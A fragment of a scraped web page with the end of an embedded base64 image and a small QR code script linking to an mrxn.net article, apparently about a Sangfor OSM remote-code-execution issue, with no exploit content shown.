D2/RVD5FwLEUP9fp07Q4g69ZRZC8EDpo73FqhxSTydYSBPbn++8ASWAwGOSea9QXB6AmTQxlmrvCxzKx+iDwTOdNDm1FuWtYpnljX2oe0HbSwdjJx4G0QeMHWcGcxv12xv4krx01kO5Jnbny84gT2QFxz62ZLDQHSFZGdFwHE1pZNBG4vr68XJILRAkYjPVhLJcT5Rhwsce4GKRyJ9cS1ca6wVuoV8GUS9+YzKZ4O11nUQGqg4DMTija85gfKnE4gp3dmGnwRrHUP0AJwanl5rhUXUOcBQB8GpTgYR51LxMogcBFqj3MqsyWituT42nxHWa0LkINB17ivcN8Sn8iZYBqLpyLwv+TLHQsUyiAlDoHIy5WzQ5pTvDVoNtHGvn8VeT+i8fJnjGUK7FrRxroE2B20sLQSndWXiZBA8oPAw5WVH0H0pA+n4Hb7oBMpAgOnr9mxfmq7MORhrnZNO5hiqtuekk5mfIUS9dDKIGEZUXjbrYw6iTjoZRAwVxctcI1/mWKhYBlEnTiauN/Ey8xA1wP4Xw8ebfZQ/v3taxrN9QkzUmrMaCK01GV2/wjMtRN9V7YyHqIH6pw2vAZFzLHQPiJzjGcJcA8FDxb5ea9nKS1Yv2vFrTmAP5PTcfz5ZfjHsl/YVymhN5uRDXEf5Nmvv4J2aXuN4hnfW7DXuk/kZpzzE9yvfZm2PzmeEqIfAnNs3JJ/GG/jlTR1iWnAf7+zfT8xM6xzEmr0Gggf6VImB8uN6IReO1xNaArUe5r61RtXLHGeE6JE5+6qZmfPCfUN0Cm9kZSCzya241f4hng6gSIDjCTYBEQOmCgKNNq8Pbc5FWWOuR5jXZp37ZM6+c/C5Pu7XI0RfYP9i+Hizj3JDvC+o04LWt+YO+qkyQvTKtRCcNUZrIPJQf5Gb5aDqAEsK9n2VAJrbKE5mrVBxNnEyGGshOGgx10PkMidfPW3DQCTY9roT2AN53dlPV/6Sgfi65RXg+nrO6nKPP/Wv+kHsCSitXQNMX8IkhHnOtULpsomTZc7+GX7JQM4W2Lk/O4EvHYieiN4gni7zEDFQdgo0T6e1RfB0oNU8qeETQuN6iHgQnhAQNcBS5f5LwTMBNN/Tkyr/KyYYc8rLvnQgarjtcycwDMTTn+HVUhCTh4qugeByX+fMQWgg0PmM1ppzLDQHUS9OBm0sbqVVbmV9DURfqD+Wu9baGZ5phoHMGmzu506gDATqtOHcX23PkxdaIz8brHtbt6pV3rkZKp8NYi1zEDEwK7/kgON9wf0yroqzBqK+10LwwP7TyePNPsoNebN9/W+38y8AAAD//6wneR0AAAAGSURBVAMAprOWhjq6ZncAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-csspost-update-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 